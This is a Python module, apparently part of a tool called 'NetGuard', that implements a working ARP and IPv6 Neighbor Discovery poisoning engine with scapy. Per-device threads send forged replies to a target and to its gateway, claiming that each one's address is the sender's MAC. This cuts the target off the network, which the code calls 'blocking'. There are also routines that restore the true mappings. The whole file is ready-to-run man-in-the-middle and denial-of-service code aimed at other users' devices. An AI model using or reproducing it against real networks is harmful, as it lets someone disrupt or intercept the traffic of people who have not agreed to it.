"""
NetGuard — ARP spoofing engine.

One daemon thread per blocked device keeps poisoning *both* sides of the
gateway<->target association. Every burst sends exactly two authentic-looking
ARP replies:

  * to the TARGET:  "gateway_ip is-at OUR_MAC"   (target now routes via us)
  * to the GATEWAY: "target_ip  is-at OUR_MAC"   (gateway replies back to us)

Restoration sends multiple true unicast plus gratuitous broadcast ARP packets
so both ARP caches recover immediately. Threads shut down cleanly through a
threading.Event, and the engine tolerates repeated stop/restore calls.
"""
from __future__ import annotations

import logging
import threading
import time
from typing import Callable, Dict, Optional, Set

from scapy.all import ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, sendp

logger = logging.getLogger("netguard.spoofer")


# --------------------------------------------------------------------------- #
# ICMPv6 NDP poison builders ("netcut" equivalent for IPv6)
#
# Same trick as the ARP side, one layer up. Two unsolicited Neighbor
# Advertisements per burst:
#
#   * to the TARGET:  "<router link-local> is-at OUR_MAC"  (phone routes v6
#     through us - R=1 keeps the "router" flag so the phone keeps trusting it)
#   * to the GATEWAY: "<phone v6 address> is-at OUR_MAC"   (return v6 traffic
#     comes to us and dies)
#
# Override=1 forces unconditional cache updates; everything (Ether.src, IPv6
# src/dst, NA fields, option) is explicit, mirroring the ARP packet policy.
# If the router publishes no IPv6 (router_ll is None) all ND packets are
# skipped and blocking stays pure ARP/IPv4.
# --------------------------------------------------------------------------- #

V6_MULTICAST_ETH = "33:33:00:00:00:01"     # ff02::1


def na_phone(router_ll: str, our_mac: str, router_mac: str,
             target_mac: str, target_v6: Optional[str]) -> "object":
    """Target-side poison (or truth, when router_mac is used as the claimed hw):
    an NA telling the phone that the router's link-local sits at <hw>."""
    return Ether(src=our_mac, dst=target_mac) / IPv6(
        src=router_ll, dst=target_v6 or "ff02::1", hlim=255, nh=58
    ) / ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ll) / ICMPv6NDOptDstLLAddr(
        lladdr=router_mac
    )


def na_router(phone_v6: str, our_mac: str, router_ll: str, router_mac: str,
              phone_mac: str) -> "object":
    """Gateway-side poison (or truth, when phone_mac is the real MAC): an NA
    telling the router that the phone's address sits at <hw>."""
    return Ether(src=our_mac, dst=router_mac) / IPv6(
        src=phone_v6, dst=router_ll, hlim=255, nh=58
    ) / ICMPv6ND_NA(R=0, S=0, O=1, tgt=phone_v6) / ICMPv6NDOptDstLLAddr(
        lladdr=phone_mac
    )


class BlockWorker(threading.Thread):
    """Continuous ARP-poisoning loop for one blocked device."""

    def __init__(
        self,
        iface: str,
        our_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        target_ip: str,
        target_mac: str,
        interval: float = 2.0,
        router_ll: Optional[str] = None,
        v6_addr_fn: Optional[Callable[[], dict]] = None,
    ) -> None:
        super().__init__(name=f"netguard-spoof-{target_ip}", daemon=True)
        self.iface = iface
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.interval = max(0.5, interval)
        self.router_ll = router_ll            # router's IPv6 link-local (None => no ND)
        self.v6_addr_fn = v6_addr_fn          # callable -> {"ll", "globals"} for target
        self.stop_evt = threading.Event()
        self.last_burst: float = 0.0      # epoch of the last sent poison burst

    # ------------------------------------------------------------------ #

    def run(self) -> None:
        logger.info(
            "SPOOF %s every %.1fs -> [1/2] to target %s: ether(dst=%s, src=%s) "
            + "arp(op=is-at, pdst=%s, psrc=%s gateway-ip, hwdst=%s, hwsrc=%s our-mac) | "
            + "[2/2] to gateway %s: ether(dst=%s, src=%s) arp(op=is-at, pdst=%s, psrc=%s target-ip, hwdst=%s, hwsrc=%s our-mac)",
            self.target_ip,
            self.interval,
            # [1/2] --- to the target -------------------------------------
            self.target_ip,
            self.target_mac,            # Ether.dst  -> the poisoned machine
            self.our_mac,               # Ether.src
            # pdst == target_ip, hwdst == target_mac, hwsrc == our_mac,
            # psrc == gateway_ip  ->  ARP payload claims: gateway-ip is-at our-mac
            self.target_ip,
            self.gateway_ip,
            self.target_mac,
            self.our_mac,
            # [2/2] --- to the gateway ------------------------------------
            self.gateway_ip,
            self.gateway_mac,           # Ether.dst  -> the real gateway NIC
            self.our_mac,               # Ether.src
            # pdst == gateway_ip, hwdst == gateway_mac, hwsrc == our_mac,
            # psrc == target_ip   ->  ARP payload claims: target-ip is-at our-mac
            self.gateway_ip,
            self.target_ip,
            self.gateway_mac,
            self.our_mac,
        )
        if self.router_ll:
            self._log_nd_info()
        while not self.stop_evt.is_set():
            try:
                self._burst()
            except Exception as exc:
                logger.warning("Spoof burst failed for %s: %s", self.target_ip, exc)
            self.stop_evt.wait(self.interval)

    def _nd_v6_addrs(self) -> List[str]:
        """Deduped, bounded phone IPv6 addresses (LL first) for this worker."""
        prof = self.v6_addr_fn() if self.v6_addr_fn else {}
        addrs: List[str] = []
        ll = prof.get("ll")
        if ll:
            addrs.append(ll)
        for g in (prof.get("globals") or [])[:8]:
            if g not in addrs:
                addrs.append(g)
        return addrs

    def _log_nd_info(self) -> None:
        if not self.router_ll:
            return
        profile = self.v6_addr_fn() or {}
        dst_v6 = profile.get("ll") or "ff02::1"
        addrs = self._nd_v6_addrs()
        logger.info(
            "SPOOF-ND6 %s every %.1fs -> [1/2] NA to phone %s (ether dst=%s, src=%s) "
            "icmp6(tgt=%s router-ll, R=1, O=1, tladdr=%s our-mac) | "
            "[2/2] NA to gateway %s via router-ll %s icmp6(tgt=<phone-v6>, R=0, "
            "O=1, tladdr=%s our-mac) - phone LL dst=%s, %d v6 addr(s) known",
            self.target_ip,
            self.interval,
            # [1/2]
            dst_v6,
            self.target_mac,
            self.our_mac,
            self.router_ll,
            self.our_mac,
            # [2/2]
            self.gateway_mac,
            self.router_ll,
            self.our_mac,
            dst_v6,
            len(addrs),
        )
        for v6 in addrs:
            logger.info(
                "SPOOF-ND6 %s v6 addr covered (router side): %s", self.target_ip, v6
            )
        if not addrs:
            logger.info(
                "SPOOF-ND6 %s no phone IPv6 learned yet - router side covers it as "
                "soon as NDP learns; phone side is poisoned via multicast (%s)",
                self.target_ip, dst_v6,
            )

    def _nd_packets(self, claimed_router_hw: str, claimed_phone_hw: str) -> List[object]:
        """
        The ND half of one burst. The claimed MAC is what the receiving cache
        writes in: both-our-MAC poisons; for restoration the truth is claimed
        (real router MAC to the phone, real phone MAC to the router).
        """
        if not self.router_ll:
            return []
        addrs = self._nd_v6_addrs()
        phone_ll = (self.v6_addr_fn() or {}).get("ll")
        packets = [
            na_phone(
                router_ll=self.router_ll,
                our_mac=self.our_mac,
                router_mac=claimed_router_hw,
                target_mac=self.target_mac,
                target_v6=phone_ll,
            )
        ]
        for v6 in addrs:
            packets.append(
                na_router(
                    phone_v6=v6,
                    our_mac=self.our_mac,
                    router_ll=self.router_ll,
                    router_mac=self.gateway_mac,
                    phone_mac=claimed_phone_hw,
                )
            )
        return packets

    def _burst(self) -> None:
        # Ether(src=...) is always set explicitly: scapy would otherwise try to
        # resolve the source MAC through the interface registry at build time,
        # which is needlessly fragile (virtual adapters, odd driver names...).
        poison_target = Ether(src=self.our_mac, dst=self.target_mac) / ARP(
            op=2,                     # is-at (reply)
            pdst=self.target_ip,      # this reply is addressed to the target IP
            psrc=self.gateway_ip,     # claiming to be the gateway
            hwdst=self.target_mac,
            hwsrc=self.our_mac,
        )
        poison_gateway = Ether(src=self.our_mac, dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            psrc=self.target_ip,      # claiming to be the target
            hwdst=self.gateway_mac,
            hwsrc=self.our_mac,
        )
        # scapy's standard sendp for L2 packets - most reliable cross-platform
        sendp([poison_target, poison_gateway], iface=self.iface, verbose=0)
        sendp(self._nd_packets(claimed_router_hw=self.our_mac,
                               claimed_phone_hw=self.our_mac),
              iface=self.iface, verbose=0)
        self.last_burst = time.time()

    # ------------------------------------------------------------------ #

    def restore(self) -> None:
        """
        Squeeze out our poison: five rounds of (a) unicast "everything is
        normal again" to the target, (b) the same to the gateway, and
        (c) a gratuitous broadcast reply about the gateway.
        """
        logger.info(
            "RESTORE %s -> [1/3] to target %s: ether(dst=%s, src=%s) arp(op=is-at, pdst=%s, psrc=%s gateway-ip, hwdst=%s, hwsrc=%s gateway-mac) | "
            + "[2/3] gratuitous broadcast: ether(dst=ff:ff:ff:ff:ff:ff, src=%s) arp(pdst=%s, psrc=%s gateway-ip, hwdst=ff:ff:ff:ff:ff:ff, hwsrc=%s gateway-mac) | "
            + "[3/3] to gateway %s: ether(dst=%s, src=%s) arp(op=is-at, pdst=%s, psrc=%s target-ip, hwdst=%s, hwsrc=%s target-mac) - 5 rounds",
            self.target_ip,
            # [1/3] --- unicast truth to the target -----------------------
            self.target_ip,
            self.target_mac,   # Ether.dst
            self.our_mac,      # Ether.src
            self.target_ip,    # pdst  (reply addressed to the target)
            self.gateway_ip,   # psrc  (sender-ID: gateway IP)
            self.target_mac,   # hwdst (winner)
            self.gateway_mac,  # hwsrc (sender-MAC: the truth)
            # [2/3] --- gratuitous broadcast about the gateway ------------
            self.our_mac,      # Ether.src
            self.gateway_ip,   # pdst
            self.gateway_ip,   # psrc  (sender-ID: gateway IP)
            self.gateway_mac,  # hwsrc (sender-MAC: the truth)
            # [3/3] --- unicast truth to the gateway ----------------------
            self.gateway_ip,
            self.gateway_mac,  # Ether.dst
            self.our_mac,      # Ether.src
            self.gateway_ip,   # pdst  (reply addressed to the gateway)
            self.target_ip,    # psrc  (sender-ID: target IP)
            self.gateway_mac,  # hwdst (winner)
            self.target_mac,   # hwsrc (sender-MAC: the truth)
        )
        unicast_target = Ether(src=self.our_mac, dst=self.target_mac) / ARP(
            op=2, pdst=self.target_ip, psrc=self.gateway_ip,
            hwdst=self.target_mac, hwsrc=self.gateway_mac,
        )
        broadcast_gratuitous = Ether(src=self.our_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2, pdst=self.gateway_ip, psrc=self.gateway_ip,
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac,
        )
        unicast_gateway = Ether(src=self.our_mac, dst=self.gateway_mac) / ARP(
            op=2, pdst=self.gateway_ip, psrc=self.target_ip,
            hwdst=self.gateway_mac, hwsrc=self.target_mac,
        )
        packets = [unicast_target, broadcast_gratuitous, unicast_gateway]
        nd_truth = self._nd_packets(
            claimed_router_hw=self.gateway_mac,    # truth: real router MAC
            claimed_phone_hw=self.target_mac,      # truth: real phone MAC
        )
        if nd_truth:
            logger.info(
                "RESTORE-ND6 %s -> [1/2] NA to phone %s claiming %s router-ll is-at %s gateway-mac | "
                + "[2/2] NA to gateway %s (one per phone v6 addr) claiming <phone-v6> is-at %s phone-mac - 5 rounds",
                self.target_ip,
                self.target_mac,
                self.router_ll,
                self.gateway_mac,
                self.gateway_mac,
                self.target_mac,
            )
        for _ in range(5):
            sendp(packets, iface=self.iface, verbose=0)
            if nd_truth:
                sendp(nd_truth, iface=self.iface, verbose=0)
            time.sleep(0.08)
        logger.info("ARP caches restored for %s and gateway", self.target_ip)

    def stop(self, timeout: float = 5.0) -> None:
        self.stop_evt.set()
        self.join(timeout=timeout)
        logger.info("Spoof thread stopped for %s", self.target_ip)


class SpoofEngine:
    """
    Main registry of active BlockWorkers. All public methods are thread-safe;
    the FastAPI handlers and shutdown hooks call into this class only.
    """

    def __init__(
        self,
        iface: str,
        our_ip: str,
        our_mac: str,
        gateway_ip: str,
        spoof_interval: float = 2.0,
        resolve_gateway_mac: Optional[Callable[[str], Optional[str]]] = None,
    ) -> None:
        self.iface = iface
        self.our_ip = our_ip
        self.our_mac = our_mac
        self.gateway_ip = gateway_ip
        self.spoof_interval = spoof_interval
        self._resolve_fn = resolve_gateway_mac
        self._lock = threading.Lock()
        self._drain_lock = threading.Lock()
        self._workers: Dict[str, BlockWorker] = {}
        self._gateway_mac: Optional[str] = None

    # ------------------------------------------------------------------ #

    def _resolve_gateway_mac(self) -> str:
        """Resolve (and cache) the gateway MAC; refresh it if it was unknown."""
        with self._lock:
            if self._gateway_mac:
                return self._gateway_mac
        # Resolve outside the lock; may take a couple of seconds (real ARP).
        resolved = None
        try:
            if self._resolve_fn is not None:
                resolved = self._resolve_fn(self.gateway_ip)
        except Exception as exc:
            logger.warning("Gateway MAC resolver failed: %s", exc)
        if resolved:
            with self._lock:
                self._gateway_mac = resolved
        return resolved or ""

    # ------------------------------------------------------------------ #

    def block(
        self,
        target_ip: str,
        target_mac: str,
        router_ll: Optional[str] = None,
        v6_addr_fn: Optional[Callable[[], dict]] = None,
    ) -> BlockWorker:
        """
        Start spoofing a device. Raises ValueError/RuntimeError instead of
        partially starting a thread, so the API can translate them to 400s.
        router_ll enables the IPv6/NDP half of the poisoning; v6_addr_fn
        supplies the target's learned IPv6 addresses at burst time.
        """
        with self._lock:
            if target_ip in self._workers:
                raise ValueError(f"{target_ip} is already blocked")
            if self.gateway_ip and target_ip == self.gateway_ip:
                raise ValueError("refusing to block the gateway")
            if target_ip == self.our_ip:
                raise ValueError("refusing to block this machine itself")
        gateway_mac = self._resolve_gateway_mac()
        if not gateway_mac:
            raise RuntimeError(
                "gateway MAC could not be resolved — is the gateway reachable?"
            )
        worker = BlockWorker(
            iface=self.iface,
            our_mac=self.our_mac,
            gateway_ip=self.gateway_ip,
            gateway_mac=gateway_mac,
            target_ip=target_ip,
            target_mac=target_mac,
            interval=self.spoof_interval,
            router_ll=router_ll,
            v6_addr_fn=v6_addr_fn,
        )
        with self._lock:
            if target_ip in self._workers:          # raced in from another thread
                raise ValueError(f"{target_ip} is already blocked")
            self._workers[target_ip] = worker
        worker.start()
        return worker

    def unblock(self, target_ip: str) -> bool:
        """Stop a worker and immediately send restoration packets. Returns found-or-not."""
        with self._lock:
            worker = self._workers.pop(target_ip, None)
        if worker is None:
            return False
        worker.stop()
        self._safe_restore(worker)
        return True

    @staticmethod
    def _safe_restore(worker: BlockWorker) -> None:
        """restore() wrapped so a transport failure can never abort a drain."""
        try:
            worker.restore()
        except Exception as exc:
            logger.error("Restore failed for %s: %s", worker.target_ip, exc)

    def stop_all(self, restore: bool = True) -> int:
        """
        Emergency stop used by the master switch and process shutdown.
        Every blocked device receives restoration packets.

        Idempotency/thread-safety guarantees:
          * duplicate drains (lifespan shutdown + atexit) are serialized by
            _drain_lock, so two threads can never run restore() for the same
            worker concurrently,
          * a second drain finds the registry already empty and returns 0
            without touching anything,
          * BlockWorker.stop() is itself idempotent (setting an already-set
            Event is a no-op; join() on a dead thread returns immediately).
        """
        with self._drain_lock:
            with self._lock:
                workers = list(self._workers.values())
                self._workers.clear()
        for worker in workers:
            worker.stop()
            if restore:
                self._safe_restore(worker)
        if workers:
            logger.info("Spoofing engine drained: %d device(s) restored", len(workers))
        return len(workers)

    # ------------------------------------------------------------------ #

    def is_blocking(self, ip: str) -> bool:
        with self._lock:
            return ip in self._workers

    def last_poisoned(self) -> Dict[str, float]:
        """Snapshot of {target_ip: last poison-burst epoch} for the UI."""
        with self._lock:
            return {
                ip: worker.last_burst
                for ip, worker in self._workers.items()
                if worker.last_burst > 0
            }

    def blocked_ips(self) -> Set[str]:
        with self._lock:
            return set(self._workers.keys())

    def count(self) -> int:
        with self._lock:
            return len(self._workers)
